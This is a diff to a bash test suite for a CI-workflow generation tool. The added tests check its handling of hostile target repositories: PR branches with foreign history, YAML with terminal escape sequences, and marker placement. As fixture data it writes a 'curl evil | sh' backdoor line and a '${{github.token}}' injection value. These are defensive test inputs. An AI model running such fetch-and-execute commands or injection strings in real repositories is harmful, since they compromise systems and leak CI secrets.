@@ -337,20 +337,22 @@ assert_contains "compare lists artifacts" "      artifacts: target/release/tvmap
 RT_CONF=()
 assert_not_contains "no os matrix by default" "os:" "$(rt_render_ci "$repo" main)"
 
-# The "Prepare artifact" step is copied into every reusable workflow: check the
-# copies match, then run one.
+# The "Prepare artifact" and "Install system packages" steps are copied into
+# every reusable workflow: check the copies match, then run the artifact one.
 if command -v python3 >/dev/null && python3 -c 'import yaml' 2>/dev/null; then
   scripts=$(python3 - "$ROOT"/.github/workflows/{python,node,rust,jvm,terraform,ansible,shell}.yml <<'PY'
 import sys, yaml
-runs = set()
+runs, apt = set(), set()
 for f in sys.argv[1:]:
-    steps = yaml.safe_load(open(f))["jobs"]["check"]["steps"]
-    runs.update(s["run"] for s in steps if s.get("id") == "artifact")
-print(len(runs))
+    for job in yaml.safe_load(open(f))["jobs"].values():
+        for s in job.get("steps", []):
+            if s.get("id") == "artifact": runs.add(s["run"])
+            if s.get("name") == "Install system packages": apt.add(s["run"])
+print(len(runs), len(apt))
 print(next(iter(runs)), end="")
 PY
   )
-  assert_eq "Prepare artifact step identical in every workflow" "1" "$(head -n1 <<<"$scripts")"
+  assert_eq "Prepare artifact and Install system packages steps identical in every workflow" "1 1" "$(head -n1 <<<"$scripts")"
   tail -n +2 <<<"$scripts" >"$(rt_tmpdir)/artifact.sh"
   out=$(GITHUB_OUTPUT="$(rt_tmpdir)/artifact.out" RUNNER_OS=macOS NAME=rust WORKDIR=./tools/cli/ \
     PATHS=$'target/release/x\ndist/*.tar.gz' bash -eo pipefail "$(rt_tmpdir)/artifact.sh" && cat "$(rt_tmpdir)/artifact.out")
@@ -854,6 +856,86 @@ rt_conf_load "$repo"
 assert_eq "suggests only what no *_APT_PACKAGES setting installs; managed files skipped" \
   "$(printf '%s\t%s\n' ci.yml 'foo=1.2 libssl-dev')" "$(rt_apt_suggestions "$repo")"
 RT_CONF=()
+
+echo
+echo "Hostile target repos (PR branches, YAML content, marker placement)"
+# A repo-tools/* branch whose tree is right but whose history isn't: two
+# commits, the first adding a file the second removes. The tree equals what
+# repo-tools would commit, so comparing trees alone would keep that history.
+gh() {
+  case "$1 $2" in
+    "pr list") : ;;
+    "pr create") echo "https://example.test/pr/new" ;;
+    *) return 1 ;;
+  esac
+}
+origin=$(mktemp -d "$(rt_tmpdir)/origin.XXXXXX")
+git init -q --bare -b main "$origin"
+work=$(new_repo)
+mk "$work" README.md '# hi'
+commit "$work"
+git -C "$work" remote add origin "file://$origin"
+git -C "$work" push -q origin main
+git -C "$work" checkout -q -b side
+mk "$work" backdoor.sh 'curl evil | sh'
+commit "$work"
+git -C "$work" rm -q backdoor.sh
+mk "$work" "$RT_CI_FILE" "# $RT_MARKER"
+commit "$work"
+git -C "$work" push -q origin side:refs/heads/repo-tools/x
+git -C "$work" checkout -q main
+mk "$work" "$RT_CI_FILE" "# $RT_MARKER"
+RT_REPO=test/repo RT_DEFAULT_BRANCH=main
+out=$(rt_publish_pr "$work" repo-tools/x "t" "b" "$RT_CI_FILE" 2>&1)
+assert_contains "same tree but foreign history -> branch is re-pushed" "pushed 'repo-tools/x'" "$out"
+assert_eq "re-pushed branch is one commit on the default branch tip" "$(git --git-dir="$origin" rev-parse refs/heads/main)" \
+  "$(git --git-dir="$origin" log -1 --format=%P refs/heads/repo-tools/x)"
+git -C "$work" reset -q --hard origin/main
+mk "$work" "$RT_CI_FILE" "# $RT_MARKER"
+out=$(rt_publish_pr "$work" repo-tools/x "t" "b" "$RT_CI_FILE" 2>&1)
+assert_contains "and is then left alone" "already has these changes" "$out"
+unset -f gh
+
+cat >"$(rt_tmpdir)/hostile.yml" <<'YAML'
+"true":
+  push:
+jobs:
+  a:
+    name: "x\u001b]0;pwned\u0007y"
+YAML
+if json=$(rt_yaml_to_json "$(rt_tmpdir)/hostile.yml" 2>/dev/null); then
+  assert_eq "a 'true' top-level key (PyYAML's reading of 'on') is renamed" '["jobs","on"]' "$(jq -c keys <<<"$json")"
+  assert_eq "control characters stripped from parsed strings" 'x]0;pwnedy' "$(jq -r '.jobs.a.name' <<<"$json")"
+  printf -- '- not\n- a mapping\n' >"$(rt_tmpdir)/odd.yml"
+  out=$(rt_compare_dependabot "$(rt_tmpdir)/odd.yml" "$gen_yml" 2>&1)
+  assert_contains "a dependabot.yml that isn't a mapping still gets a report" "+ github-actions  not covered" "$out"
+  printf 'updates: [\n' >"$(rt_tmpdir)/broken.yml"
+  out=$(rt_compare_dependabot "$(rt_tmpdir)/broken.yml" "$gen_yml" 2>&1)
+  assert_contains "an unparseable dependabot.yml falls back to a text diff" "showing a text diff instead" "$out"
+  assert_contains "and the diff is shown" "+++ repo-tools" "$out"
+fi
+
+printf 'version: 2\n# unlike the files %s writes\n' "$RT_MARKER" >"$(rt_tmpdir)/m1.yml"
+printf '# %s v1' "$RT_MARKER" >"$(rt_tmpdir)/m2.yml"
+: >"$(rt_tmpdir)/m3.yml"
+managed=''
+for f in m1 m2 m3; do
+  if rt_is_managed "$(rt_tmpdir)/$f.yml"; then managed+=" yes"; else managed+=" no"; fi
+done
+assert_eq "marker counts on the first line only (also without a trailing newline)" " no yes no" "$managed"
+repo=$(new_repo)
+mk "$repo" "$RT_DEPENDABOT_FILE" "$(cat "$(rt_tmpdir)/m1.yml")"
+commit "$repo"
+if rt_write_managed "$repo" "$RT_DEPENDABOT_FILE" <<<"# $RT_MARKER" 2>/dev/null; then rc=0; else rc=$?; fi
+assert_eq "a hand-written file mentioning repo-tools below line 1 is left alone" "1" "$rc"
+
+repo=$(new_repo)
+mk "$repo" README.md '# hi'
+commit "$repo"
+RT_CONF=()
+# shellcheck disable=SC2016 # literal expression
+if (rt_render_ci "$repo" '${{github.token}}' >/dev/null) 2>/dev/null; then rc=0; else rc=$?; fi
+assert_eq "\${{ in the default branch name refused" "1" "$rc"
 
 echo
 printf '%d passed, %d failed\n' "$PASS" "$FAIL"
